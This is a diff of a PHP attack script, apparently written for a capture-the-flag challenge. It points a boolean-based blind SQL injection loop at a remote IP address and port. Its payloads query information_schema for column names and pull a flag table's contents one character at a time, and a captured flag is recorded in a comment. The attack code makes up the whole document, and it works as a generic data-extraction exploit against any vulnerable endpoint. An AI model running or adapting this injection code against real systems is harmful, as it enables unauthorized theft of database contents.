@@ -21,7 +21,7 @@ function post_request($url, $data) {
 
 echo "--START ATTACKING--\n";
 
-$url = 'http://localhost/ws/blind/';
+$url = 'http://202.125.94.123:2088/blind/';
 
 $id=1;
 while(true){
@@ -32,11 +32,11 @@ while(true){
 		//flag_123
 		
 		//GET COLOUMN
-		$inject = "' and ascii(substring((SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name = 'flag_123'),".($id).",1)) = ".$i." -- -";
+		//$inject = "' and ascii(substring((SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name = 'flag_123'),".($id).",1)) = ".$i." -- -";
 		//flag_321
 		
 		//GET FLAGGG
-		$inject = "' and ascii(substring((SELECT GROUP_CONCAT(flag_321) FROM flag_123),".($id).",1)) = ".$i." -- -";
+		//$inject = "' and ascii(substring((SELECT GROUP_CONCAT(flag_321) FROM flag_123),".($id).",1)) = ".$i." -- -";
 		//hackfest0x4{S3L4M4T_AnD4_LU7U5_17623}
 		
 		$send = post_request($url, $data.$inject);
